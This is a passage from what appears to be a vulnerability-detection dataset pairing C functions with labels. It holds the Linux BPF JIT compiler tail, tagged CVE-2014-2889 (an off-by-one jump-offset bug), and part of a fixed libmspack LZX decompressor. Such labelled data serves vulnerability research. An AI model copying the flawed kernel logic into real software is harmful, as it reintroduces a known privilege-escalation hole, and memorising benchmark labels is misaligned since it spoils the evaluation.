BPF_S_MISC_TAX: /* X = A */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xc3);\t/* mov    %eax,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_MISC_TXA: /* A = X */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tEMIT2(0x89, 0xd8);\t/* mov    %ebx,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_IMM: /* A = K */\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_A();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xb8, K); /* mov $imm32,%eax */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_IMM: /* X = K */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (!K)\n\t\t\t\t\tCLEAR_X();\n\t\t\t\telse\n\t\t\t\t\tEMIT1_off32(0xbb, K); /* mov $imm32,%ebx */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_MEM: /* A = mem[K] : mov off8(%rbp),%eax */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_MEM: /* X = mem[K] : mov off8(%rbp),%ebx */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x8b, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ST: /* mem[K] = A : mov %eax,off8(%rbp) */\n\t\t\t\tseen |= SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x45, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_STX: /* mem[K] = X : mov %ebx,off8(%rbp) */\n\t\t\t\tseen |= SEEN_XREG | SEEN_MEM;\n\t\t\t\tEMIT3(0x89, 0x5d, 0xf0 - K*4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_LEN: /*\tA = skb->len; */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, len) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov    off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LDX_W_LEN: /* X = skb->len; */\n\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, len)))\n\t\t\t\t\t/* mov off8(%rdi),%ebx */\n\t\t\t\t\tEMIT3(0x8b, 0x5f, offsetof(struct sk_buff, len));\n\t\t\t\telse {\n\t\t\t\t\tEMIT2(0x8b, 0x9f);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, len), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_PROTOCOL: /* A = ntohs(skb->protocol); */\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, protocol) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, protocol))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, protocol));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, protocol), 4);\n\t\t\t\t}\n\t\t\t\tEMIT2(0x86, 0xc4); /* ntohs() : xchg   %al,%ah */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_IFINDEX:\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, dev))) {\n\t\t\t\t\t/* movq off8(%rdi),%rax */\n\t\t\t\t\tEMIT4(0x48, 0x8b, 0x47, offsetof(struct sk_buff, dev));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x48, 0x8b, 0x87); /* movq off32(%rdi),%rax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, dev), 4);\n\t\t\t\t}\n\t\t\t\tEMIT3(0x48, 0x85, 0xc0);\t/* test %rax,%rax */\n\t\t\t\tEMIT_COND_JMP(X86_JE, cleanup_addr - (addrs[i] - 6));\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct net_device, ifindex) != 4);\n\t\t\t\tEMIT2(0x8b, 0x80);\t/* mov off32(%rax),%eax */\n\t\t\t\tEMIT(offsetof(struct net_device, ifindex), 4);\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_MARK:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, mark) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, mark))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, mark));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, mark), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_RXHASH:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, rxhash) != 4);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, rxhash))) {\n\t\t\t\t\t/* mov off8(%rdi),%eax */\n\t\t\t\t\tEMIT3(0x8b, 0x47, offsetof(struct sk_buff, rxhash));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT2(0x8b, 0x87);\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, rxhash), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_QUEUE:\n\t\t\t\tBUILD_BUG_ON(FIELD_SIZEOF(struct sk_buff, queue_mapping) != 2);\n\t\t\t\tif (is_imm8(offsetof(struct sk_buff, queue_mapping))) {\n\t\t\t\t\t/* movzwl off8(%rdi),%eax */\n\t\t\t\t\tEMIT4(0x0f, 0xb7, 0x47, offsetof(struct sk_buff, queue_mapping));\n\t\t\t\t} else {\n\t\t\t\t\tEMIT3(0x0f, 0xb7, 0x87); /* movzwl off32(%rdi),%eax */\n\t\t\t\t\tEMIT(offsetof(struct sk_buff, queue_mapping), 4);\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_ANC_CPU:\n#ifdef CONFIG_SMP\n\t\t\t\tEMIT4(0x65, 0x8b, 0x04, 0x25); /* mov %gs:off32,%eax */\n\t\t\t\tEMIT((u32)(unsigned long)&cpu_number, 4); /* A = smp_processor_id(); */\n#else\n\t\t\t\tCLEAR_A();\n#endif\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_ABS:\n\t\t\t\tfunc = sk_load_word;\ncommon_load:\t\t\tseen |= SEEN_DATAREF;\n\t\t\t\tif ((int)K < 0)\n\t\t\t\t\tgoto out;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K); /* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_ABS:\n\t\t\t\tfunc = sk_load_half;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LD_B_ABS:\n\t\t\t\tfunc = sk_load_byte;\n\t\t\t\tgoto common_load;\n\t\t\tcase BPF_S_LDX_B_MSH:\n\t\t\t\tif ((int)K < 0) {\n\t\t\t\t\tif (pc_ret0 != -1) {\n\t\t\t\t\t\tEMIT_JMP(addrs[pc_ret0] - addrs[i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tCLEAR_A();\n\t\t\t\t\tEMIT_JMP(cleanup_addr - addrs[i]);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = sk_load_byte_msh - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi */\n\t\t\t\tEMIT1_off32(0xe8, t_offset); /* call sk_load_byte_msh */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_W_IND:\n\t\t\t\tfunc = sk_load_word_ind;\ncommon_load_ind:\t\tseen |= SEEN_DATAREF | SEEN_XREG;\n\t\t\t\tt_offset = func - (image + addrs[i]);\n\t\t\t\tEMIT1_off32(0xbe, K);\t/* mov imm32,%esi   */\n\t\t\t\tEMIT1_off32(0xe8, t_offset);\t/* call sk_load_xxx_ind */\n\t\t\t\tbreak;\n\t\t\tcase BPF_S_LD_H_IND:\n\t\t\t\tfunc = sk_load_half_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_LD_B_IND:\n\t\t\t\tfunc = sk_load_byte_ind;\n\t\t\t\tgoto common_load_ind;\n\t\t\tcase BPF_S_JMP_JA:\n\t\t\t\tt_offset = addrs[i + K] - addrs[i];\n\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\tbreak;\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_K, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_K, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_K, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_K,X86_JNE, X86_JE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGT_X, X86_JA, X86_JBE);\n\t\t\tCOND_SEL(BPF_S_JMP_JGE_X, X86_JAE, X86_JB);\n\t\t\tCOND_SEL(BPF_S_JMP_JEQ_X, X86_JE, X86_JNE);\n\t\t\tCOND_SEL(BPF_S_JMP_JSET_X,X86_JNE, X86_JE);\n\ncond_branch:\t\t\tf_offset = addrs[i + filter[i].jf] - addrs[i];\n\t\t\t\tt_offset = addrs[i + filter[i].jt] - addrs[i];\n\n\t\t\t\t/* same targets, can avoid doing the test :) */\n\t\t\t\tif (filter[i].jt == filter[i].jf) {\n\t\t\t\t\tEMIT_JMP(t_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tswitch (filter[i].code) {\n\t\t\t\tcase BPF_S_JMP_JGT_X:\n\t\t\t\tcase BPF_S_JMP_JGE_X:\n\t\t\t\tcase BPF_S_JMP_JEQ_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x39, 0xd8); /* cmp %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_X:\n\t\t\t\t\tseen |= SEEN_XREG;\n\t\t\t\t\tEMIT2(0x85, 0xd8); /* test %ebx,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JEQ_K:\n\t\t\t\t\tif (K == 0) {\n\t\t\t\t\t\tEMIT2(0x85, 0xc0); /* test   %eax,%eax */\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tcase BPF_S_JMP_JGT_K:\n\t\t\t\tcase BPF_S_JMP_JGE_K:\n\t\t\t\t\tif (K <= 127)\n\t\t\t\t\t\tEMIT3(0x83, 0xf8, K); /* cmp imm8,%eax */\n\t\t\t\t\telse\n\t\t\t\t\t\tEMIT1_off32(0x3d, K); /* cmp imm32,%eax */\n\t\t\t\t\tbreak;\n\t\t\t\tcase BPF_S_JMP_JSET_K:\n\t\t\t\t\tif (K <= 0xFF)\n\t\t\t\t\t\tEMIT2(0xa8, K); /* test imm8,%al */\n\t\t\t\t\telse if (!(K & 0xFFFF00FF))\n\t\t\t\t\t\tEMIT3(0xf6, 0xc4, K >> 8); /* test imm8,%ah */\n\t\t\t\t\telse if (K <= 0xFFFF) {\n\t\t\t\t\t\tEMIT2(0x66, 0xa9); /* test imm16,%ax */\n\t\t\t\t\t\tEMIT(K, 2);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tEMIT1_off32(0xa9, K); /* test imm32,%eax */\n\t\t\t\t\t}\n \t\t\t\t\tbreak;\n \t\t\t\t}\n \t\t\t\tif (filter[i].jt != 0) {\n\t\t\t\t\tif (filter[i].jf && f_offset)\n\t\t\t\t\t\tt_offset += is_near(f_offset) ? 2 : 5;\n \t\t\t\t\tEMIT_COND_JMP(t_op, t_offset);\n \t\t\t\t\tif (filter[i].jf)\n \t\t\t\t\t\tEMIT_JMP(f_offset);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tEMIT_COND_JMP(f_op, f_offset);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t/* hmm, too complex filter, give up with jit compiler */\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tilen = prog - temp;\n\t\t\tif (image) {\n\t\t\t\tif (unlikely(proglen + ilen > oldproglen)) {\n\t\t\t\t\tpr_err(\"bpb_jit_compile fatal error\\n\");\n\t\t\t\t\tkfree(addrs);\n\t\t\t\t\tmodule_free(NULL, image);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tmemcpy(image + proglen, temp, ilen);\n\t\t\t}\n\t\t\tproglen += ilen;\n\t\t\taddrs[i] = proglen;\n\t\t\tprog = temp;\n\t\t}\n\t\t/* last bpf instruction is always a RET :\n\t\t * use it to give the cleanup instruction(s) addr\n\t\t */\n\t\tcleanup_addr = proglen - 1; /* ret */\n\t\tif (seen)\n\t\t\tcleanup_addr -= 1; /* leaveq */\n\t\tif (seen & SEEN_XREG)\n\t\t\tcleanup_addr -= 4; /* mov  -8(%rbp),%rbx */\n\n\t\tif (image) {\n\t\t\tWARN_ON(proglen != oldproglen);\n\t\t\tbreak;\n\t\t}\n\t\tif (proglen == oldproglen) {\n\t\t\timage = module_alloc(max_t(unsigned int,\n\t\t\t\t\t\t   proglen,\n\t\t\t\t\t\t   sizeof(struct work_struct)));\n\t\t\tif (!image)\n\t\t\t\tgoto out;\n\t\t}\n\t\toldproglen = proglen;\n\t}\n\tif (bpf_jit_enable > 1)\n\t\tpr_err(\"flen=%d proglen=%u pass=%d image=%p\\n\",\n\t\t       flen, proglen, pass, image);\n\n\tif (image) {\n\t\tif (bpf_jit_enable > 1)\n\t\t\tprint_hex_dump(KERN_ERR, \"JIT code: \", DUMP_PREFIX_ADDRESS,\n\t\t\t\t       16, 1, image, proglen, false);\n\n\t\tbpf_flush_icache(image, image + proglen);\n\n\t\tfp->bpf_func = (void *)image;\n\t}\nout:\n\tkfree(addrs);\n\treturn;\n}\n", "func_hash": 67387289507214147014158093367984081971, "file_name": "bpf_jit_comp.c", "file_hash": 114327817519201563092074124098250767576, "cwe": ["CWE-189"], "cve": "CVE-2014-2889", "cve_desc": "Off-by-one error in the bpf_jit_compile function in arch/x86/net/bpf_jit_comp.c in the Linux kernel before 3.1.8, when BPF JIT is enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges via a long jump after a conditional jump.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-2889"}
{"idx": 159179, "project": "libmspack", "commit_id": "18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3", "project_url": "https://github.com/kyz/libmspack", "commit_url": "https://github.com/kyz/libmspack/commit/18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3", "commit_message": "Prevent a 1-byte underread of the input buffer if an odd-sized data block comes just before an uncompressed block header", "target": 0, "func": "int lzxd_decompress(struct lzxd_stream *lzx, off_t out_bytes) {\n  /* bitstream and huffman reading variables */\n  register unsigned int bit_buffer;\n  register int bits_left, i=0;\n  unsigned char *i_ptr, *i_end;\n  register unsigned short sym;\n\n  int match_length, length_footer, extra, verbatim_bits, bytes_todo;\n  int this_run, main_element, aligned_bits, j;\n  unsigned char *window, *runsrc, *rundest, buf[12];\n  unsigned int frame_size=0, end_frame, match_offset, window_posn;\n  unsigned int R0, R1, R2;\n\n  /* easy answers */\n  if (!lzx || (out_bytes < 0)) return MSPACK_ERR_ARGS;\n  if (lzx->error) return lzx->error;\n\n  /* flush out any stored-up bytes before we begin */\n  i = lzx->o_end - lzx->o_ptr;\n  if ((off_t) i > out_bytes) i = (int) out_bytes;\n  if (i) {\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n  }\n  if (out_bytes == 0) return MSPACK_ERR_OK;\n\n  /* restore local state */\n  RESTORE_BITS;\n  window = lzx->window;\n  window_posn = lzx->window_posn;\n  R0 = lzx->R0;\n  R1 = lzx->R1;\n  R2 = lzx->R2;\n\n  end_frame = (unsigned int)((lzx->offset + out_bytes) / LZX_FRAME_SIZE) + 1;\n\n  while (lzx->frame < end_frame) {\n    /* have we reached the reset interval? (if there is one?) */\n    if (lzx->reset_interval && ((lzx->frame % lzx->reset_interval) == 0)) {\n      if (lzx->block_remaining) {\n\tD((\"%d bytes remaining at reset interval\", lzx->block_remaining))\n\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n      }\n\n      /* re-read the intel header and reset the huffman lengths */\n      lzxd_reset_state(lzx);\n      R0 = lzx->R0;\n      R1 = lzx->R1;\n      R2 = lzx->R2;\n    }\n\n    /* LZX DELTA format has chunk_size, not present in LZX format */\n    if (lzx->is_delta) {\n      ENSURE_BITS(16);\n      REMOVE_BITS(16);\n    }\n\n    /* read header if necessary */\n    if (!lzx->header_read) {\n      /* read 1 bit. if bit=0, intel filesize = 0.\n       * if bit=1, read intel filesize (32 bits) */\n      j = 0; READ_BITS(i, 1); if (i) { READ_BITS(i, 16); READ_BITS(j, 16); }\n      lzx->intel_filesize = (i << 16) | j;\n      lzx->header_read = 1;\n    } \n\n    /* calculate size of frame: all frames are 32k except the final frame\n     * which is 32kb or less. this can only be calculated when lzx->length\n     * has been filled in. */\n    frame_size = LZX_FRAME_SIZE;\n    if (lzx->length && (lzx->length - lzx->offset) < (off_t)frame_size) {\n      frame_size = lzx->length - lzx->offset;\n    }\n\n    /* decode until one more frame is available */\n    bytes_todo = lzx->frame_posn + frame_size - window_posn;\n    while (bytes_todo > 0) {\n      /* initialise new block, if one is needed */\n      if (lzx->block_remaining == 0) {\n\t/* realign if previous block was an odd-sized UNCOMPRESSED block */\n\tif ((lzx->block_type == LZX_BLOCKTYPE_UNCOMPRESSED) &&\n\t    (lzx->block_length & 1))\n\t{\n\t  READ_IF_NEEDED;\n\t  i_ptr++;\n\t}\n\n\t/* read block type (3 bits) and block length (24 bits) */\n\tREAD_BITS(lzx->block_type, 3);\n\tREAD_BITS(i, 16); READ_BITS(j, 8);\n\tlzx->block_remaining = lzx->block_length = (i << 8) | j;\n\t/*D((\"new block t%d len %u\", lzx->block_type, lzx->block_length))*/\n\n\t/* read individual block headers */\n\tswitch (lzx->block_type) {\n\tcase LZX_BLOCKTYPE_ALIGNED:\n\t  /* read lengths of and build aligned huffman decoding tree */\n\t  for (i = 0; i < 8; i++) { READ_BITS(j, 3); lzx->ALIGNED_len[i] = j; }\n\t  BUILD_TABLE(ALIGNED);\n\t  /* no break -- rest of aligned header is same as verbatim */\n\tcase LZX_BLOCKTYPE_VERBATIM:\n\t  /* read lengths of and build main huffman decoding tree */\n\t  READ_LENGTHS(MAINTREE, 0, 256);\n\t  READ_LENGTHS(MAINTREE, 256, LZX_NUM_CHARS + lzx->num_offsets);\n\t  BUILD_TABLE(MAINTREE);\n\t  /* if the literal 0xE8 is anywhere in the block... */\n\t  if (lzx->MAINTREE_len[0xE8] != 0) lzx->intel_started = 1;\n\t  /* read lengths of and build lengths huffman decoding tree */\n\t  READ_LENGTHS(LENGTH, 0, LZX_NUM_SECONDARY_LENGTHS);\n\t  BUILD_TABLE_MAYBE_EMPTY(LENGTH);\n\t  break;\n\n\tcase LZX_BLOCKTYPE_UNCOMPRESSED:\n\t  /* because we can't assume otherwise */\n \t  lzx->intel_started = 1;\n \n \t  /* read 1-16 (not 0-15) bits to align to bytes */\n\t  if (bits_left == 0) ENSURE_BITS(16);\n \t  bits_left = 0; bit_buffer = 0;\n \n \t  /* read 12 bytes of stored R0 / R1 / R2 values */\n\t  for (rundest = &buf[0], i = 0; i < 12; i++) {\n\t    READ_IF_NEEDED;\n\t    *rundest++ = *i_ptr++;\n\t  }\n\t  R0 = buf[0] | (buf[1] << 8) | (buf[2]  << 16) | (buf[3]  << 24);\n\t  R1 = buf[4] | (buf[5] << 8) | (buf[6]  << 16) | (buf[7]  << 24);\n\t  R2 = buf[8] | (buf[9] << 8) | (buf[10] << 16) | (buf[11] << 24);\n\t  break;\n\n\tdefault:\n\t  D((\"bad block type\"))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n      }\n\n      /* decode more of the block:\n       * run = min(what's available, what's needed) */\n      this_run = lzx->block_remaining;\n      if (this_run > bytes_todo) this_run = bytes_todo;\n\n      /* assume we decode exactly this_run bytes, for now */\n      bytes_todo           -= this_run;\n      lzx->block_remaining -= this_run;\n\n      /* decode at least this_run bytes */\n      switch (lzx->block_type) {\n      case LZX_BLOCKTYPE_VERBATIM:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n\t      if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              }\n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                                  break;\n\t    case 1: match_offset = R1; R1=R0;        R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2=R0;        R0 = match_offset; break;\n\t    case 3: match_offset = 1;  R2=R1; R1=R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      READ_BITS(verbatim_bits, extra);\n\t      match_offset = position_base[match_offset] - 2 + verbatim_bits;\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\t    \n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_ALIGNED:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n              if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              } \n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                             break;\n\t    case 1: match_offset = R1; R1 = R0; R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2 = R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      match_offset = position_base[match_offset] - 2;\n\t      if (extra > 3) {\n\t\t/* verbatim and aligned bits */\n\t\textra -= 3;\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += (verbatim_bits << 3);\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra == 3) {\n\t\t/* aligned bits only */\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra > 0) { /* extra==1, extra==2 */\n\t\t/* verbatim bits only */\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += verbatim_bits;\n\t      }\n\t      else /* extra == 0 */ {\n\t\t/* ??? not defined in LZX specification! */\n\t\tmatch_offset = 1;\n\t      }\n\t      /* update repeated offset LRU queue */\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_UNCOMPRESSED:\n\t/* as this_run 